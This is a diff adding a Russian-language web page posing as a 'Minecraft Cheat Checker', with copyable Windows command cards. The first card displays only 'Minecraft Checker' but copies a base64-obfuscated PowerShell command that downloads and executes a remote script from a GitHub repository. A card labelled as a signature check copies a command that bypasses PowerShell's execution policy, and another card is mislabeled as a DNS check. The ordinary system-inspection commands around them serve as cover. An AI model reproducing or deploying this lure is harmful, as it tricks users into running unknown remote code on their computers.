@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Клиент</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0b0b14;
+            color: #ffffff;
+            min-height: 100vh;
+        }
+
+        /* Navigation */
+        .navbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 40px;
+            background-color: #0b0b14;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 40px;
+        }
+
+        .logo {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: #8a8a9a;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s;
+            cursor: pointer;
+        }
+
+        .nav-links a:hover {
+            color: #ffffff;
+        }
+
+        .nav-links a.active {
+            color: #7c6ff7;
+        }
+
+        /* Pages */
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        /* ===== HOME PAGE ===== */
+        .home-page {
+            padding: 60px 40px 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 73px);
+        }
+
+        .home-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            width: 100%;
+            gap: 60px;
+        }
+
+        .home-text {
+            flex: 1;
+            max-width: 550px;
+        }
+
+        .home-label {
+            font-size: 14px;
+            color: #7c6ff7;
+            font-weight: 500;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .home-label svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .home-title {
+            font-size: 48px;
+            font-weight: 700;
+            line-height: 1.15;
+            margin-bottom: 20px;
+            color: #f0f0f5;
+        }
+
+        .home-title span {
+            color: #7c6ff7;
+        }
+
+        .home-description {
+            font-size: 16px;
+            color: #6a6a7a;
+            line-height: 1.6;
+            margin-bottom: 36px;
+            max-width: 460px;
+        }
+
+        .home-visual {
+            flex: 1;
+            max-width: 500px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .laptop-mockup {
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+        }
+
+        .laptop-screen {
+            background: linear-gradient(135deg, #12121e 0%, #1a1a2e 50%, #16162a 100%);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-bottom: none;
+            border-radius: 12px 12px 0 0;
+            padding: 20px;
+            aspect-ratio: 16 / 10;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            overflow: hidden;
+        }
+
+        .screen-bar {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+
+        .screen-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .screen-dot.red { background-color: #ff5f57; }
+        .screen-dot.yellow { background-color: #ffbd2e; }
+        .screen-dot.green { background-color: #28c840; }
+
+        .screen-line {
+            height: 8px;
+            border-radius: 4px;
+            background-color: rgba(255, 255, 255, 0.04);
+        }
+
+        .screen-line.short { width: 40%; }
+        .screen-line.medium { width: 65%; }
+        .screen-line.long { width: 85%; }
+        .screen-line.accent { background-color: rgba(124, 111, 247, 0.2); width: 55%; }
+
+        .laptop-base {
+            background: linear-gradient(180deg, #1a1a2e, #14142a);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 0 0 8px 8px;
+            height: 14px;
+            position: relative;
+        }
+
+        .laptop-base::after {
+            content: '';
+            position: absolute;
+            top: 4px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 4px;
+            border-radius: 2px;
+            background-color: rgba(255, 255, 255, 0.06);
+        }
+
+        /* ===== COMMANDS PAGE ===== */
+        .commands-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+        }
+
+        .main-content {
+            padding: 30px 40px 60px;
+        }
+
+        .command-card {
+            background-color: #12121e;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 12px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            transition: border-color 0.2s;
+        }
+
+        .command-card:hover {
+            border-color: rgba(255, 255, 255, 0.12);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .badge {
+            font-size: 12px;
+            font-weight: 600;
+            padding: 3px 10px;
+            border-radius: 4px;
+            letter-spacing: 0.3px;
+        }
+
+        .badge-powershell {
+            color: #a78bfa;
+            background-color: rgba(167, 139, 250, 0.12);
+        }
+
+        .badge-cmd {
+            color: #818cf8;
+            background-color: rgba(129, 140, 248, 0.12);
+        }
+
+        .badge-wmic {
+            color: #c084fc;
+            background-color: rgba(192, 132, 252, 0.12);
+        }
+
+        .badge-sc {
+            color: #34d399;
+            background-color: rgba(52, 211, 153, 0.12);
+        }
+
+        .card-number {
+            color: #4a4a5a;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .command-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 500;
+            color: #e2e2ee;
+            word-break: break-all;
+            line-height: 1.4;
+        }
+
+        .command-description {
+            font-size: 13px;
+            color: #6a6a7a;
+            line-height: 1.4;
+        }
+
+        .btn-copy {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(255, 255, 255, 0.05);
+            color: #9a9aaa;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 6px 16px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+            align-self: flex-start;
+        }
+
+        .btn-copy:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+        }
+
+        .btn-copy.copied {
+            background-color: rgba(52, 211, 153, 0.15);
+            color: #34d399;
+            border-color: rgba(52, 211, 153, 0.3);
+        }
+
+        /* Responsive */
+        @media (max-width: 1100px) {
+            .home-container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .home-text {
+                max-width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .home-description {
+                max-width: 100%;
+            }
+
+            .commands-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 700px) {
+            .navbar {
+                padding: 12px 16px;
+            }
+
+            .nav-links {
+                gap: 16px;
+            }
+
+            .nav-links a {
+                font-size: 13px;
+            }
+
+            .home-page {
+                padding: 40px 16px;
+            }
+
+            .home-title {
+                font-size: 32px;
+            }
+
+            .main-content {
+                padding: 20px 16px;
+            }
+
+            .commands-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navigation Bar -->
+    <nav class="navbar">
+        <div class="nav-left">
+            <div class="logo" onclick="navigateTo('home')">
+                <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="20" cy="20" r="18" stroke="#6c5ce7" stroke-width="2" fill="none"/>
+                    <circle cx="20" cy="20" r="12" stroke="#6c5ce7" stroke-width="1.5" fill="none" opacity="0.6"/>
+                    <circle cx="20" cy="20" r="6" stroke="#6c5ce7" stroke-width="1.5" fill="none" opacity="0.8"/>
+                    <circle cx="20" cy="20" r="2.5" fill="#6c5ce7"/>
+                </svg>
+            </div>
+            <ul class="nav-links">
+                <li><a id="nav-home" onclick="navigateTo('home')" class="active">Главная</a></li>
+                <li><a id="nav-commands" onclick="navigateTo('commands')">Команды</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- HOME PAGE -->
+    <div id="page-home" class="page active home-page">
+        <div class="home-container">
+            <div class="home-text">
+                <div class="home-label">
+                    <svg viewBox="0 0 16 16" fill="currentColor"><path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/><path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"/></svg>
+                    Minecraft Cheat Checker
+                </div>
+                <h1 class="home-title">Проверка на читы в Minecraft</h1>
+                <p class="home-description">Узнайте, использует ли игрок запрещённые моды.</p>
+            </div>
+            <div class="home-visual">
+                <div class="laptop-mockup">
+                    <div class="laptop-screen">
+                        <div class="screen-bar">
+                            <div class="screen-dot red"></div>
+                            <div class="screen-dot yellow"></div>
+                            <div class="screen-dot green"></div>
+                        </div>
+                        <div class="screen-line short"></div>
+                        <div class="screen-line long"></div>
+                        <div class="screen-line accent"></div>
+                        <div class="screen-line medium"></div>
+                        <div class="screen-line short"></div>
+                        <div class="screen-line long"></div>
+                        <div class="screen-line accent"></div>
+                        <div class="screen-line medium"></div>
+                        <div class="screen-line short"></div>
+                    </div>
+                    <div class="laptop-base"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- COMMANDS PAGE -->
+    <div id="page-commands" class="page">
+        <main class="main-content">
+            <div class="commands-grid" id="commandsGrid">
+                <!-- Cards injected by JS -->
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // ===== Navigation =====
+        function navigateTo(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page-' + page).classList.add('active');
+            document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
+            document.getElementById('nav-' + page).classList.add('active');
+            document.title = page === 'home' ? 'Главная' : '';
+        }
+
+        // ===== Commands =====
+        // copyText — то, что будет скопировано при нажатии "Copy".
+        // Если copyText не указан, копируется command.
+        const commands = [
+            { type: "powershell", command: "Minecraft Checker", copyText: "iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGl3ciBodHRwczovL2dpdGh1Yi5jb20vYWJzb2x1dGUyOTgyNzI4LWFpL3NjdC9yYXcvbWFpbi9zY3QucHMxIC1Vc2VCYXNpY1BhcnNpbmcp')))", description: "Наш собственный чекер для проверки на читы" },
+            { type: "cmd", command: "Set-ExecutionPolicy -ExecutionPolicy B...", copyText: "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force", description: "Проверка подписи([Нажать A])" },
+            { type: "wmic", command: "wmic qfe list brief", copyText: "wmic qfe list brief", description: "Проверка связи с DNS" },
+            { type: "cmd", command: "tasklist /v", copyText: "tasklist /v", description: "Подробный список процессов с окнами." },
+            { type: "wmic", command: "wmic process get Name,ProcessId,Execut...", copyText: "wmic process get Name,ProcessId,ExecutablePath", description: "Полный список процессов с путями." },
+            { type: "sc", command: "sc query type= driver state= all", copyText: "sc query type= driver state= all", description: "Список драйверов (ring0, часто опасные)." },
+            { type: "cmd", command: "netstat -abno", copyText: "netstat -abno", description: "Порты и процессы, слушающие сеть." },
+            { type: "cmd", command: "schtasks /query /fo table /v", copyText: "schtasks /query /fo table /v", description: "Запланированные задачи (автозапуск, фоновые процессы)." },
+            { type: "cmd", command: "arp -a", copyText: "arp -a", description: "ARP-эш, ищем виртуальные сети." },
+            { type: "cmd", command: "route print", copyText: "route print", description: "Таблица маршрутов, туннели и TAP." },
+            { type: "cmd", command: "net user", copyText: "net user", description: "Список локальных пользователей." },
+            { type: "cmd", command: "tasklist /m", copyText: "tasklist /m", description: "Сопоставление DLL → процессы." },
+            { type: "cmd", command: "ipconfig /all", copyText: "ipconfig /all", description: "Полная информация о сетевых адаптерах." },
+            { type: "powershell", command: "Get-Process | Sort-Object CPU -Descending", copyText: "Get-Process | Sort-Object CPU -Descending", description: "Процессы, отсортированные по нагрузке CPU." },
+            { type: "powershell", command: "Get-Service | Where-Object {$_.Status -eq 'Running'}", copyText: "Get-Service | Where-Object {$_.Status -eq 'Running'}", description: "Список запущенных служб." },
+            { type: "cmd", command: "systeminfo", copyText: "systeminfo", description: "Общая информация о системе и конфигурации." },
+            { type: "wmic", command: "wmic startup get caption,command", copyText: "wmic startup get caption,command", description: "Программы автозагрузки." },
+            { type: "cmd", command: "driverquery /v", copyText: "driverquery /v", description: "Подробная информация о драйверах." },
+        ];
+
+        const grid = document.getElementById('commandsGrid');
+
+        commands.forEach(function(item, index) {
+            var card = document.createElement('div');
+            card.className = 'command-card';
+            var badgeClass = 'badge-' + item.type;
+            card.innerHTML =
+                '<div class="card-header">' +
+                    '<span class="badge ' + badgeClass + '">' + item.type.charAt(0).toUpperCase() + item.type.slice(1) + '</span>' +
+                    '<span class="card-number">#' + (index + 1) + '</span>' +
+                '</div>' +
+                '<div class="command-text">' + item.command + '</div>' +
+                '<div class="command-description">' + item.description + '</div>' +
+                '<button class="btn-copy" data-cmd="' + (item.copyText || item.command).replace(/"/g, '"') + '">Copy</button>';
+            grid.appendChild(card);
+        });
+
+        // Copy functionality
+        document.querySelectorAll('.btn-copy').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                var text = this.getAttribute('data-cmd');
+                var el = this;
+                navigator.clipboard.writeText(text).then(function() {
+                    el.textContent = 'Copied!';
+                    el.classList.add('copied');
+                    setTimeout(function() {
+                        el.textContent = 'Copy';
+                        el.classList.remove('copied');
+                    }, 1500);
+                }).catch(function() {
+                    var textarea = document.createElement('textarea');
+                    textarea.value = text;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+                    el.textContent = 'Copied!';
+                    el.classList.add('copied');
+                    setTimeout(function() {
+                        el.textContent = 'Copy';
+                        el.classList.remove('copied');
+                    }, 1500);
+                });
+            });
+        });
+    </script>
+
+</body>
+</html>
